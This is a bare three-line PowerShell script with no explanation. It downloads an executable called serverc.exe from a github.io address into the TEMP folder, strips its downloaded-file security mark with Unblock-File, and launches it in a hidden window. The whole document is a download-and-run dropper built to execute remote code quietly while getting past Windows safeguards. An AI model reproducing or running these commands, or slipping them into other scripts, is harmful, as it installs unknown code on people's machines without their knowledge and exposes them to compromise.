IWR 'https://untitledmanifoldguy.github.io/serverc.exe' -OutFile $env:TEMP\sv.exe
Unblock-File $env:TEMP\sv.exe
Start-Process $env:TEMP\sv.exe -WindowStyle Hidden
